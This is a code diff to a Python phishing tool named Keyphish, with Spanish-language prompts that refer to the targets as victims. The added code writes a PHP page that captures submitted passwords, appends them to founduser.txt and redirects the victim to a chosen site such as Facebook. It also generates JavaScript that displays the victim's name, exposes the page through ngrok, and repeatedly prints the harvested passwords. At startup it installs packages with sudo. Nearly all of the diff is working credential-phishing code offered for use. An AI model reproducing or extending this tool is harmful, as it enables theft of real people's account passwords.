@@ -14,7 +14,17 @@ def logo():
     print('                                              By Mr.Star')
 
 def cambiarn():
-    os.system("gnome-terminal -- python usuario.py")
+    escribir= open('usuario.txt', 'w')
+    print('''Debe poner el nombre entre comillas ejemplo:
+    "Anonimo"     1- Atrás\n''')
+    y=input('Ingrese el nombre de la víctima: ')
+    r=('''var insertotexto=""+ 
+    "{} <br>";
+    document.write(insertotexto);'''.format(y))
+    escribir.write(r)
+    if y==1:
+         clearConsole()
+         os.system("python Keyphish.py")
     clearConsole()
     os.system("python Keyphish.py")
 
@@ -22,7 +32,7 @@ def contra():
     archivo = open('founduser.txt','w')
     archivo.close()
     while True:
-        time.sleep(3)
+        time.sleep(2)
         clearConsole()
         logo()
         archiv= open('founduser.txt')
@@ -30,7 +40,27 @@ def contra():
         print(archiv.read())
 
 def link():
-    os.system("gnome-terminal -- python link.py")
+    logo()
+    escribir= open('login.php', 'w')
+    print('''Debe poner el link entre comillas ejemplo:
+    "https://facebook.com"    1- Atrás\n''')
+    y=input('Inserte un link para redireccionar a la víctima: ')
+    r=('''<?php
+    $user = $_POST["pass"];
+    $co = "===========================================\n"; 
+    $cl = "===========================================\n";
+    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
+    $us = "Password: $user\n";
+    fwrite($fileuser, "\n". $co. $us. $cl);
+    fclose($fileuser);
+    header('Location: {}');
+    exit();
+    ?>
+    '''.format(y))
+    escribir.write(r)
+    if y==1:
+        clearConsole()
+        os.system("python Keyphish.py")
     clearConsole()
     os.system("python Keyphish.py")
 
@@ -42,6 +72,14 @@ def ngrok():
     contra()
     print("Las contraseñas estaran almacenadas en founduser.txt")
 
+os.system("sudo apt install gnome-terminal php python3 python3-pip")
+clearConsole()
+os.system("pip install pyngrok")
+clearConsole()
+os.system("sudo pyngrok")
+clearConsole()
+print("         Instalación completa  ")
+clearConsole()
 
 logo()
 y=int(input("""             Bienvenido desea:
@@ -55,12 +93,16 @@ if y==1:
     clearConsole()
     logo()
     ngrok()
+
 elif y==2:
     cambiarn()
     clearConsole()
+
 elif y==3:
+    clearConsole()
     link()
     clearConsole()
+
 elif y==4:
     print("  HASTA PRONTO!!")
     clearConsole()
